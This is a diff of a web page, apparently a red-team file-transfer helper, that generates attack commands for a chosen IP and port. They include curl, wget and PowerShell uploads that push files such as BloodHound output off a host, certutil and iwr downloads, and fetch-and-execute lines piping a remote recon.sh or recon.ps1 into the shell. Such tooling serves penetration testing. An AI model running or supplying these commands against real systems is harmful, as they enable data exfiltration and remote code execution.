@@ -175,48 +175,17 @@
     </div>
   </div>
 
-  <div id="upload-area" class="upload-area">
+  <div id="upload-area" class="download-area">
+    
     <h3>Upload file to remote host</h3>
-   
-    
-
-    
-    
-
     <h3>Command Line</h3>
     <div id="command-line">
       <label for="file-field">File:</label>
-      <input type="text" id="upload-file-field" placeholder="Nombre del archivo" list="file-suggestions" />
+      <input type="text" id="download-file-field" placeholder="Nombre del archivo" list="file-suggestions" />
       <datalist id="file-suggestions"></datalist> <!-- Datalist para sugerencias -->
 
       <label for="upload-port-field">Port:</label>
-      <input type="number" id="upload-port-field" placeholder="80"  value="80" />
-
-      <label for="ip-select">IP:</label>
-      <select class="ip-select" id="upload-ip-select"></select>
-
-      <button id="upload-generate-command">Generar Comando</button>
-      <p id="upload-command-output"></p>
-    </div>
-  </div>
-
-   <div id="download-area" class="download-area">
-
-
-     <h3>Upload file to this host</h3>
-    <input type="file" id="file-input" />
-    <button id="upload-button">Upload</button>
-    <p id="upload-status"></p>
-
-        
-    <h3>Command Line</h3>
-    <div id="command-line">
-      <label for="download-file-field">File:</label>
-      <input type="text" id="download-file-field" placeholder="C:\temp\bloodhound.zip" value="C:\temp\bloodhound.zip" />
-      <datalist id="file-suggestions"></datalist> <!-- Datalist para sugerencias -->
-
-      <label for="download-port-field">Port:</label>
-      <input type="number" id="download-port-field" placeholder="80" value="80"/>
+      <input type="number" id="download-port-field" placeholder="80"  value="80" />
 
       <label for="ip-select">IP:</label>
       <select class="ip-select" id="download-ip-select"></select>
@@ -226,21 +195,33 @@
     </div>
   </div>
 
+   <div id="download-area" class="upload-area">
 
+     <h3>Download file to this host</h3>
+    <input type="file" id="file-input" />
+    <button id="upload-button">Upload</button>
+    <p id="upload-status"></p>
+
+        
+    <h3>Command Line</h3>
+    <div id="command-line">
+      <label for="upload-file-field">File:</label>
+      <input type="text" id="upload-file-field" placeholder="C:\temp\bloodhound.zip" value="C:\temp\bloodhound.zip" />
+      <datalist id="file-suggestions"></datalist> <!-- Datalist para sugerencias -->
+
+      <label for="download-port-field">Port:</label>
+      <input type="number" id="upload-port-field" placeholder="80" value="80"/>
+
+      <label for="ip-select">IP:</label>
+      <select class="ip-select" id="upload-ip-select"></select>
+
+      <button id="upload-generate-command">Generar Comando</button>
+      <p id="upload-command-output"></p>
+    </div>
+  </div>
 
 
 <script>
-  /*document.addEventListener('DOMContentLoaded', async () => {
-    // Obtener direcciones IP del servidor
-    const response = await fetch('/ips');
-    const ips = await response.json();
-    const ipSelect = document.getElementById('ip-select');
-    ips.forEach(ip => {
-      const option = document.createElement('option');
-      option.value = ip;
-      option.textContent = ip;
-      ipSelect.appendChild(option);
-    });*/
 
 // Función para copiar al portapapeles
 function copyToClipboard(id) {
@@ -248,8 +229,6 @@ function copyToClipboard(id) {
     console.log(id)
     navigator.clipboard.writeText(text)
 }
-
-
 
 
   document.addEventListener('DOMContentLoaded', async () => {
@@ -274,52 +253,6 @@ function copyToClipboard(id) {
         console.error("Error al obtener las IPs:", error);
     }
 
-
-
-
-
-
-/*
-
-
-
-  document.getElementById('upload-generate-command').onclick = () => {
-    const file = document.getElementById('upload-file-field').value;
-    const port = document.getElementById('upload-port-field').value;
-    const ip = document.getElementById('upload-ip-select').value;
-
-    if (file && port && ip) {
-      // Comandos de descarga
-      const uploadCommandsWindows = [
-        `(New-Object System.Net.WebClient).UploadFile('http://${ip}:${port}/', 'C:\\Users\\kermi\\Desktop\\${file}')`,
-        `curl.exe -F 'file=@C:\\Users\\kermi\\Desktop\\${file}' http://${ip}:${port}/`,
-        `iwr -uri http://${ip}:${port}/ -Method Post -InFile 'C:\\Users\\kermi\\Desktop\\${file}' -UseBasicParsing`
-      ];
-      const uploadCommandsLinux = [
-        `curl -X POST -F 'file=@${file}' http://${ip}:${port}/`,
-        `wget --method=POST --header="Content-Type: multipart/form-data" --body-file=${file} http://${ip}:${port}/`
-      ];
-
-
-      document.getElementById('command-output').innerHTML = `
-      <strong>Upload Commands (Windows):</strong><br>
-      ${uploadCommandsWindows.join('<br>')}<br><br>
-      <strong>Upload Commands (Linux):</strong><br>
-      ${uploadCommandsLinux.join('<br>')}<br><br>
-      `;
-
-    } else {
-      alert('Por favor, rellena todos los campos.');
-    }
-  };
-
-*/
-
-
-
-
-
-
 document.getElementById('upload-generate-command').onclick = () => {
     const file = document.getElementById('upload-file-field').value;
     const port = document.getElementById('upload-port-field').value;
@@ -336,11 +269,7 @@ document.getElementById('upload-generate-command').onclick = () => {
             `curl -X POST -F 'file=@${file}' http://${ip}:${port}/`,
             `wget --method=POST --header="Content-Type: multipart/form-data" --body-file=${file} http://${ip}:${port}/`
         ];
-        const auxiliaryReconTools = [
-            `. <(curl http://${ip}:${port}/recon.sh)`,
-            `iex ((New-Object System.Net.WebClient).DownloadString('http://${ip}:${port}/recon.ps1'))`
-        ];
-
+        
         // Generar HTML dinámico con IDs únicos
         let outputHTML = '<strong>Upload Commands (Windows):</strong><br>';
         let idCounter = 0; // Para asignar IDs únicos a cada comando
@@ -367,6 +296,7 @@ document.getElementById('upload-generate-command').onclick = () => {
         }
 
         // Comandos auxiliares
+        /*
         outputHTML += `<br><strong>Auxiliary Recon Tools</strong><br>`;
         for (const command of auxiliaryReconTools) {
             outputHTML += `
@@ -376,7 +306,7 @@ document.getElementById('upload-generate-command').onclick = () => {
             </div>`;
             idCounter++;
         }
-
+        */
         // Mostrar los resultados en el contenedor
         document.getElementById('upload-command-output').innerHTML = outputHTML;
 
@@ -384,23 +314,6 @@ document.getElementById('upload-generate-command').onclick = () => {
         alert('Por favor, rellena todos los campos.');
     }
 };
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
   document.getElementById('download-generate-command').onclick = () => {
@@ -414,7 +327,7 @@ document.getElementById('upload-generate-command').onclick = () => {
             `curl http://${ip}:${port}/download/${file} -o ${file}`,
             `certutil.exe -f -urlcache -split http://${ip}:${port}/download/${file}`,
             `iwr -uri http://${ip}:${port}/download/${file} -OutFile ${file}`,
-            `iwr -UseBasicParsing http://${ip}:${port}/download/${file}`
+            `iwr -UseBasicParsing http://${ip}:${port}/download/${file} -OutFile ${file}`
         ];
 
         const downloadCommandsLinux = [
@@ -430,45 +343,27 @@ document.getElementById('upload-generate-command').onclick = () => {
                 </div>
             `).join('');
 
+        const auxiliaryReconTools = [
+            `. <(curl http://${ip}:${port}/recon.sh)`,
+            `iex ((New-Object System.Net.WebClient).DownloadString('http://${ip}:${port}/recon.ps1'))`
+        ];
+
+
         document.getElementById('download-command-output').innerHTML = `
             <strong>Download Commands (Windows):</strong><br>
             ${generateCommandHTML(downloadCommandsWindows)}<br><br>
             <strong>Download Commands (Linux):</strong><br>
-            ${generateCommandHTML(downloadCommandsLinux)}
+            ${generateCommandHTML(downloadCommandsLinux)}<br><br>
+            <strong>Auxiliary recon tools:</strong><br>
+            ${generateCommandHTML(auxiliaryReconTools)}
+
         `;
     } else {
         alert('Por favor, rellena todos los campos.');
     }
   };
 
-
-
-
 });
-
-
-
-
-
-/*
-    // Copiar comando al portapapeles
-    document.getElementById('copy-command').onclick = () => {
-      const commandOutput = document.getElementById('command-output').textContent;
-      if (commandOutput) {
-        navigator.clipboard.writeText(commandOutput)
-          .then(() => alert('Comando copiado al portapapeles'))
-          .catch(err => console.error('Error al copiar el texto: ', err));
-      } else {
-        alert('No hay comando generado para copiar.');
-      }
-    };
-  });
-
-*/
-
-
-
-
 
   document.addEventListener('DOMContentLoaded', async () => {
     await fetchFiles();
@@ -480,8 +375,6 @@ document.getElementById('upload-generate-command').onclick = () => {
       const isDarkMode = document.body.classList.contains('dark-mode');
       document.getElementById('toggle-mode').textContent = isDarkMode ? 'Clear' : 'Dark';
     };
-
-
 
     // Manejador de pestañas
     document.getElementById('editor-tab').onclick = () => {
@@ -527,9 +420,6 @@ document.getElementById('upload-generate-command').onclick = () => {
     };
 
 
-
-
-
   document.getElementById('download-button').onclick = async () => {
       const fileInput = document.getElementById('file-input');
       const file = fileInput.files[0];
@@ -560,9 +450,6 @@ document.getElementById('upload-generate-command').onclick = () => {
         document.getElementById('upload-status').textContent = 'Error al subir el archivo.';
       }
     };
-
-
-
     
   });
 
@@ -689,11 +576,6 @@ document.getElementById('upload-generate-command').onclick = () => {
   document.getElementById('upload-area').style.visibility = 'hidden';
   document.getElementById('download-area').style.visibility = 'hidden';
 
-
-
 </script>
 </body>
 </html>
-
-
-  
